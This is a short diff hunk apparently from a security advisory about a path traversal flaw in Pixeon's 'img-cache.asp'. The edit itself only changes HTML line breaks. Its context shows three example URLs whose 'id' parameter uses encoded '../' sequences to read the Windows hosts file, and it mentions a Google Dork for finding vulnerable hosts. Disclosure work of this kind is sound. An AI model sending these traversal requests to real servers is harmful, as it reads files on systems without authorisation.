@@ -16,7 +16,7 @@ To find vulnerable hosts, you can use the following Google Dork:<br>
 The first directories are customizable, so here are three examples of vulnerable URLs: <br>
 https://example.com/laudo/multimagem/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
 https://example.com/web_laudos/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
-https://example.com/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br><br>
+https://example.com/img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts <br>
 	
 ### Vendor:
 Pixeon
